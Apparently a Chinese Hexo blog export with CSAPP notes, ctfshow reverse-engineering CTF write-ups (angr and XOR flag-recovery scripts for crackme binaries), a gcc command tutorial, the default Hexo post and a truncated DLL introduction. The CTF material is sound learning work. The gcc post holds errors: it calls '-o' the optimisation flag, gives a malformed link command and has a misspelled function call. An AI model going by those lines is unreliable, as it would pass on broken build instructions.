<h2 id="算术和逻辑操作"><a href="#算术和逻辑操作" class="headerlink" title="算术和逻辑操作"></a>算术和逻辑操作</h2><h3 id="算术操作"><a href="#算术操作" class="headerlink" title="算术操作"></a>算术操作</h3><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230405214930.png"></p>
<h3 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h3><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230405220431.png"></p>
<h2 id="函数传参和寄存器的关系"><a href="#函数传参和寄存器的关系" class="headerlink" title="函数传参和寄存器的关系"></a>函数传参和寄存器的关系</h2><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230406093404.png"></p>
<p>是按照这个顺序进行传参，并且返回值默认是ax。</p>
]]></content>
      <tags>
        <tag>阅读</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow刷题</title>
    <url>/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<p>每周做点题目</p>
<span id="more"></span>

<h3 id="RE3"><a href="#RE3" class="headerlink" title="RE3"></a>RE3</h3><p>看到这个题首先想到了angr，其实都还没怎么看逻辑</p>
<p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926124047.png"></p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    p=angr.Project(path)</span><br><span class="line">    init_state=p.factory.entry_state()</span><br><span class="line">    sm=p.factory.simgr(init_state)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isGood</span>(<span class="params">sm</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;OK&quot;</span> <span class="keyword">in</span> sm.posix.dumps(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isBad</span>(<span class="params">sm</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Error!&quot;</span> <span class="keyword">in</span> sm.posix.dumps(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    sm.explore(find=isGood,avoid=isBad)</span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926124504.png"></p>
<p>其实是不报有希望的，因为除了angrctf还没怎么用angr解除过题目，结果真的出来了，但是明显不是flag，题目的描述是取最小解，4位值。记住我圈起来的这个1A9F.<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926125354.png"></p>
<p>我们的输入存放到input数组中，长度是5，也就是rsp+60 ~rsp+64存储合规输入，多余的部分会溢出到紧挨着的v19中。</p>
<p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926130226.png"></p>
<p>动态调试得到循环6次之后v16的值是0xE560,所以0xE560+V17[6]&#x3D;&#x3D;0XFFFF,所以v17[6]&#x3D;0x1A9F,又因为上面的<code>dest[strlen(input) - 6] = 0;</code>作用是将最后一位置0，所以正确的输入是xxxxx1A9Fx，x的值可以是任意,其实细看上面的angr跑出的结果就有1A9F，而且前面是五个占位符</p>
<p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926131315.png"></p>
<p>提交的flag：flag{1A9F}</p>
<h3 id="RE4"><a href="#RE4" class="headerlink" title="RE4"></a>RE4</h3><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926181141.png"></p>
<p>简化下来就是我们输入1 2 3他给出表中下标1 2 3的元素，将其异或7，与给定字符串进行比较，不同的是我们不是直接输入位置信息，而是输入一个比较大的数，程序进行模运算和除法运算，从而转化出位置信息。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">假设输入26</span><br><span class="line">26%<span class="attribute">26</span>=0      得到第一个位置0</span><br><span class="line">26/<span class="attribute">26</span>=1      大于0继续</span><br><span class="line">1%26 =1      得到第二个位置1</span><br><span class="line">1/26 =0      等于0结束</span><br><span class="line">所以转化的位置信息是[0,1]</span><br><span class="line">得到的字符是       <span class="string">&#x27;)&#x27;</span> 和 <span class="string">&#x27;(&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926181728.png"></p>
<p>一次比较两个字符，比较的字符串是<code>/..v4p$$!&gt;Y59-</code></p>
<p>逆向思路是，首先将其异或7得到原来的字符串，然后根据所的字符串查询其在表中的位置，比如说得到了（）），那么其位置信息就是1 0 0， 然后将其恢复至原来的大数。有些奇怪的是输入676得到的位置信息是0 0 1，那么恢复脚本应该是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pos2)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">   flag+=pos2[i]           <span class="number">1</span>    <span class="number">26</span>    <span class="number">676</span></span><br><span class="line">   <span class="keyword">if</span> i&gt;=<span class="number">1</span>:  </span><br><span class="line">    flag*=<span class="number">26</span>              <span class="number">26</span>    <span class="number">676</span>   </span><br></pre></td></tr></table></figure>

<p>但实际这样是不对的，问题的关键在<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926184638.png"></p>
<p>v6可以理解位输入的长度，v7从最后一位逐个存储并进行异或，所以这里等价于一个倒序，所以真正的解密脚本应该是这样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">positions=[]</span><br><span class="line">a=<span class="string">b&#x27;/..v4p$$!&gt;Y59-&#x27;</span></span><br><span class="line">b=<span class="string">b&#x27;)(*&amp;^%489$!057@#&gt;&lt;:2163qwe&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    result=a[i]^<span class="number">7</span></span><br><span class="line">    c+=<span class="built_in">bytes</span>([result])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">in</span> b:</span><br><span class="line">        position=b.index(result)</span><br><span class="line">        positions.append(position)</span><br><span class="line"><span class="comment">#print(positions)</span></span><br><span class="line"></span><br><span class="line">pos=[<span class="number">1</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">2</span>]</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pos:</span><br><span class="line">    flag*=<span class="number">26</span>      <span class="comment">#这里的顺序很重要</span></span><br><span class="line">    flag+=i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="真的是签到"><a href="#真的是签到" class="headerlink" title="真的是签到"></a>真的是签到</h3><p>ASP+UPX壳</p>
<p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230926210653.png"></p>
<h3 id="愚人杯-babyre"><a href="#愚人杯-babyre" class="headerlink" title="愚人杯 babyre"></a>愚人杯 babyre</h3><p>这一题考察的应该是附加调试fork出的子进程，可是老弄不好<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927015225.png"></p>
<p>看了一个师傅的是直接静态分析加推测，官方wp给的也是静态分析，不过很草率。</p>
<p>加密逻辑</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v2 = <span class="built_in">strlen</span>(input);</span><br><span class="line">  dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, v2 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, input, v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v2; ++j )</span><br><span class="line">      v5 += dest[j];</span><br><span class="line">    dest[i] = v5;                               <span class="comment">// dest[0]=dest[0]+dest[1]+……dest[m]</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密思路就是从最后一个入手，dest[23]减去前面22个元素，则可以得到加密前的dest[23],dest[22]减去dest[23],再减去dest[0~21]即可得到原来的数。每一个元素减去除自身以外所有元素之和即可得到加密前的数据，必须要从最后一项开始。</p>
<p>脚本</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data,<span class="type">int</span> len)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">25</span>] = &#123;<span class="number">0x79</span>, <span class="number">0x8F</span>, <span class="number">0xAA</span>, <span class="number">0xEE</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, <span class="number">0x65</span>, <span class="number">0x53</span>, <span class="number">0x2B</span>, <span class="number">0xEE</span>, <span class="number">0x7B</span>, <span class="number">0x80</span>, <span class="number">0x9B</span>, <span class="number">0xD7</span>, <span class="number">0x7D</span>, <span class="number">0x9B</span>, <span class="number">0xD0</span>, <span class="number">0x2B</span>, <span class="number">0xE8</span>, <span class="number">0x71</span>, <span class="number">0x7E</span>, <span class="number">0x9B</span>, <span class="number">0xBD</span>, <span class="number">0xFD</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len=<span class="built_in">strlen</span>(data);</span><br><span class="line">    <span class="type">char</span> dest;</span><br><span class="line">    decode(data,<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,(<span class="type">char</span>*)data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data,<span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=len<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;len;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=j)</span><br><span class="line">            &#123;</span><br><span class="line">                data[i]-=data[j];<span class="comment">//倒序，除了自身都减一遍</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="eazy-pyc"><a href="#eazy-pyc" class="headerlink" title="eazy_pyc"></a>eazy_pyc</h3><p>pyc在线反编译得到py<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927142619.png"></p>
<p>很简单，这里练习一下python的使用，之前脚本大部分都是用c实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x16&#x27;</span>,<span class="string">&#x27;\x1d&#x27;</span>,<span class="string">&#x27;\x1e&#x27;</span>,<span class="string">&#x27;\x1a&#x27;</span>,<span class="string">&#x27;\x18&#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\xff&#x27;</span>,<span class="string">&#x27;\xd0&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;\x03&#x27;</span>,<span class="string">&#x27;\x02&#x27;</span>,<span class="string">&#x27;\x14&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;\xbd&#x27;</span>,<span class="string">&#x27;\xf7&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\xda&#x27;</span>,<span class="string">&#x27;\xf9&#x27;</span>,<span class="string">&#x27;\x1c&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\xda&#x27;</span>,<span class="string">&#x27;\xd4&#x27;</span>,<span class="string">&#x27;\xd1&#x27;</span>,<span class="string">&#x27;\x0b&#x27;</span>,<span class="string">&#x27;\xc7&#x27;</span>,<span class="string">&#x27;\xc7&#x27;</span>,<span class="string">&#x27;\x1a&#x27;</span>,<span class="string">&#x27;\x90&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;\xa1&#x27;</span>]</span><br><span class="line"><span class="comment">#[]是列表</span></span><br><span class="line"></span><br><span class="line">l = <span class="built_in">len</span>(code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">3</span>):</span><br><span class="line">    code[l-<span class="number">4</span>-i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(code[l-<span class="number">4</span>-i]) ^ <span class="built_in">ord</span>(code[l-<span class="number">3</span>-i ]))</span><br><span class="line">    <span class="comment">#python中异或的对象必须要是整数，所以用ord返回给定字符的 Unicode 码点（整数）</span></span><br><span class="line"></span><br><span class="line">code = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, code))  <span class="comment"># 返回code的ascii 列表形式</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = (code[i] - i ) </span><br><span class="line">    flag += <span class="built_in">chr</span>(num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="eazy-cc"><a href="#eazy-cc" class="headerlink" title="eazy_cc"></a>eazy_cc</h3><p>签到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v16=<span class="string">&#x27;08111f425a5c1c1e1a526d410e3a1e5e5d573402165e561216&#x27;</span></span><br><span class="line">key=<span class="string">&#x27;key123&#x27;</span></span><br><span class="line">v16_bytes=<span class="built_in">bytes</span>.fromhex(v16)</span><br><span class="line">result=<span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v16_bytes)):</span><br><span class="line">    result.append(v16_bytes[i]^<span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;cc_re_good_good!&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="eazy-re"><a href="#eazy-re" class="headerlink" title="eazy_re"></a>eazy_re</h3><p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927192858.png"></p>
<p>输入一个字符串，输入两个key作为种子对输入进行异或操作，然后逐字节输出密文。<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927193218.png"></p>
<p>A13AA0是一个300*300的大数组。异或是可逆的，那我们应该将阿狸给出的密文当作明文输入进去，再使用正确的种子key就可以还原阿狸的话，又提到了base64<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230927200337.png"></p>
<p>应该是要讲这些字符进行base64编码，否则有很多不可见字符。“flag”base64之后得到“ZmxhZ”，对应的明文的开始应该就是ZmxhZ，那么我们输入ZmxhZ，在输入两个正确的key种子即可，现在问题的关键就是得到key，把数组dump出来，然后暴破以下试试。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> key1;</span><br><span class="line">    <span class="type">int</span> key2;</span><br><span class="line">    <span class="type">int</span> v9;</span><br><span class="line">    <span class="type">int</span> v10;</span><br><span class="line">    <span class="keyword">for</span>(key1=<span class="number">0</span>;key1&lt;<span class="number">200</span>;key1++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(key2=<span class="number">0</span>;key2&lt;<span class="number">200</span>;key2++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> v3=key1%<span class="number">299</span>;</span><br><span class="line">            <span class="type">int</span> v4=key2%<span class="number">299</span>;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> v5=<span class="number">0</span>;</span><br><span class="line">            v10=key2%<span class="number">299</span>;</span><br><span class="line">            <span class="type">char</span> input[]=<span class="string">&quot;ZmxhZ&quot;</span>;</span><br><span class="line">            <span class="type">int</span> com[<span class="number">5</span>];</span><br><span class="line">            <span class="type">int</span> data[<span class="number">5</span>]=&#123;<span class="number">90</span>,<span class="number">171</span>,<span class="number">198</span>,<span class="number">235</span>,<span class="number">229</span>&#125;;</span><br><span class="line">            <span class="type">int</span> v6=<span class="built_in">strlen</span>(input);</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                v9=arr[v3][v4]^input[v5];</span><br><span class="line">                v3=(v9+v3)%<span class="number">299</span>;</span><br><span class="line">                v10=(v9+v10)%<span class="number">300</span>;</span><br><span class="line">                com[v5]=v9;</span><br><span class="line">                v4=v10;</span><br><span class="line">                ++v5;</span><br><span class="line">            &#125;<span class="keyword">while</span>(v5&lt;v6);</span><br><span class="line">            <span class="keyword">if</span>(com[<span class="number">0</span>]==data[<span class="number">0</span>]&amp;&amp;com[<span class="number">1</span>]==data[<span class="number">1</span>]&amp;&amp;com[<span class="number">2</span>]==data[<span class="number">2</span>]&amp;&amp;com[<span class="number">3</span>]==data[<span class="number">3</span>]&amp;&amp;com[<span class="number">4</span>]==data[<span class="number">4</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,key1);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,key2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>解出来key1&#x3D;67，key2&#x3D;74。接下来的任务就是补充”Zmxhz“这个字符串。然后就没有然后了，因为我正常的思路是：异或是对称的，将数据原封不动的输入进去即可，可是后来发现v9取决于key和input，因为input的内容发生了变化，所以肯定不能原封不动的输入进去，我苦思冥想一天也没想到怎么求逆，甚至看了别人的题解也不懂，后来想到了暴破，嘎嘎好用。</p>
<p>真的看不懂下面这个逆向思路，可能是麻了脑子<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230928172041.png"></p>
<p>暴破脚本：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> tmp=<span class="number">33</span>;tmp&lt;<span class="number">128</span>;tmp++)</span><br><span class="line">        &#123;</span><br><span class="line">            v9=arr[key1][key2]^tmp;</span><br><span class="line">            <span class="keyword">if</span>(v9==input[v5])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,tmp);</span><br><span class="line">                <span class="keyword">goto</span> lab1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v9=arr[key1][key2]^input[v5];</span><br><span class="line"> lab1:  key1=(v9+key1)%<span class="number">299</span>;</span><br><span class="line">        key2=(v9+key2)%<span class="number">300</span>;</span><br><span class="line">        <span class="comment">//com[v5]=v9;</span></span><br><span class="line">        ++v5;</span><br><span class="line">    &#125;<span class="keyword">while</span>(v5&lt;v6);</span><br></pre></td></tr></table></figure>

<p>在do while循环里，使用一个tmp进行尝试，如果他异或得到的数字和阿狸给出的数字相同则说明他就是我们要求的那个字符，将其打印出来。最后进行一下base64</p>
<p><img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230928171641.png"></p>
<p>后面就是misc部分了，纯靠猜测。将矩阵转成图片，我的pillow试了很多次总是超时，就搁置了<img src="/2023/10/01/ctfshow%E5%88%B7%E9%A2%98/QQ%E6%88%AA%E5%9B%BE20230928211949.png"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>gcc常用命令</title>
    <url>/2023/08/18/gcc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>1.<strong>首先是最常用的，</strong>源文件生成可执行文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc main.c</span><br></pre></td></tr></table></figure>

<p>默认生成a.out的可执行文件，main.c经历了<strong>预处理</strong>、<strong>汇编</strong>、<strong>编译</strong>、<strong>链接</strong>操作</p>
<span id="more"></span>

<p><strong>2.</strong> 指定输出文件的文件名 <strong>-o</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc main.c -o main</span><br></pre></td></tr></table></figure>

<p>生成可执行文件main</p>
<p><strong>3.</strong> 预处理 -E</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -E main.c -o main.i</span><br></pre></td></tr></table></figure>

<p>最简单的打印hello，world都要大几百行代码。预处理的作用是直接将#include&lt;xxx.h&gt;、#include”xxx.h”还有宏进行直接的复制粘贴操作.尖括号&lt;&gt;和双引号”“的区别在于，尖括号包含的头文件预处理器会直接搜索指定目录，双引号包含的头文件预处理器则优先在当前目录下查找。也就是系统的头文件我们一般都使用尖括号&lt;&gt;,自己定义的则使用双引号。gcc有选项可以更改目录，这里不再多说。</p>
<p><strong>4.</strong> 编译生成汇编代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -S main.i</span><br></pre></td></tr></table></figure>

<p>生成名为main.s的文本文件，里面是汇编语言。</p>
<p><strong>5.</strong> 汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c main.s</span><br></pre></td></tr></table></figure>

<p>汇编器将汇编代码转换成目标文件main.o</p>
<p><strong>6.</strong> 链接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc main.o -o main</span><br></pre></td></tr></table></figure>

<p>链接器将目标文件链接为可执行文件-o为优化等级，-O1、-O2、-O3，级别越大优化效果越好。</p>
<h3 id="多文件编译方法"><a href="#多文件编译方法" class="headerlink" title="多文件编译方法"></a>多文件编译方法</h3><p>对于add.h、add.c、main.c三个文件</p>
<p>add.h</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure>

<p>add.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>,addd(a,b));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1.直接源码到可执行文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc main.c add.c -o main</span><br></pre></td></tr></table></figure>

<p>生成名为main的可执行文件</p>
<p><strong>2.分别编译各个源文件，然后进行链接</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c add.c    #生成add.o</span><br><span class="line">gcc -c main.c   #生成main.o</span><br><span class="line">gcc -o add.o main.o -o main     #链接生成可执行文件</span><br></pre></td></tr></table></figure>

<p>两种方法各有优缺点，第一种简便但是需要对所有文件进行重新编译，第二种方法可以只重新编译修改的文件，而不需要浪费时间重新编译整个工程。（详情请看另一篇介绍编译与链接的文章）</p>
<p>参考文章：<a href="https://blog.csdn.net/yinjiabin/article/details/7731817">linux gcc编译多个源文件的方法_yinjiabin的博客-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>gcc</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/12/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h2 id><a href="#" class="headerlink" title></a><span id="more"></span></h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a><!--more--></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>动态链接库（DLL）及其工作原理</title>
    <url>/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a><strong>动态链接库</strong></h3><blockquote>
<p>动态链接库（Dynamic Link Library 或者Dynamic-link Library，缩写为DLL），<strong>是微软公司在微软Windows操作系统中，实现共享函数库概念的一种方式</strong>。 这些库函数的扩展名是”.dll、.ocx（包含ActiveX控制的库）或者.drv（旧式的系统驱动程序）。linux下的动态链接库后缀是so，即（shared object），共享对象。</p>
</blockquote>
<span id="more"></span>

